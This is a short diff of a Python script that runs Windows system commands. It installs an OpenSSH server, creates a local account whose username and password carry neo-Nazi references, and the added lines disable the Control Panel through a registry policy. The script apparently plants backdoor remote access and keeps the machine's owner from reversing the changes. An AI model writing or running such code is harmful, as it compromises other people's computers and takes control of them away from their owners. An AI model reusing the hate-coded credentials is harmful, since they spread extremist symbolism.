@@ -9,6 +9,11 @@ os.system('Add-WindowsFeature -Name OpenSSH.Server')
 # Set username and password
 os.system('net user adolfhitler birdistheword1488 /add')
 
+def disable_control_panel():
+    os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")
+
+disable_control_panel()
+
 def get_ip():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
